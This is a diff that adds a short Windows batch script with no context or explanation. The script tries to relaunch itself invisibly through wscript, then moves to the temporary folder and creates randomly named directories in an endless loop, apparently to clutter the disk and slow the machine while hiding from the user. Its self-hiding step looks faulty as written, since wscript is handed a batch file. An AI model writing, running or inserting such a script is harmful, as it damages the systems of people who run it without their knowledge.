@@ -1,0 +1,15 @@
+@echo off
+
+if "%~1"=="hidden" goto :execute
+
+
+start /b "" wscript.exe //b "%~f0" hidden
+exit
+
+:execute
+
+cd /d %TEMP%
+
+:Tech
+md %Random%
+goto Tech
